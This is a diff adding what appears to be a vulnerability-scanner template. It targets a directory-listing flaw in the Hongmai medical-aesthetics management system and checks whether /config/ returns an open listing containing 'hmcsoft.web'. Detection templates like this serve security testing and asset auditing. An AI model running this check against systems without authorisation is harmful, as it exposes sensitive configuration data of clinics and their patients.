@@ -1,0 +1,25 @@
+id: poc-yaml-hmcsoft-config-path-traversal
+
+info:
+  name: 宏脉医美行业管理系统 config 路径遍历漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+  description: |
+    宏脉医美行业管理系统存在目录遍历漏洞，通过访问 /config/ 可以获取敏感配置信息。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/config/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/config/"
+          - "[To Parent Directory]"
+          - "hmcsoft.web"
+        part: body
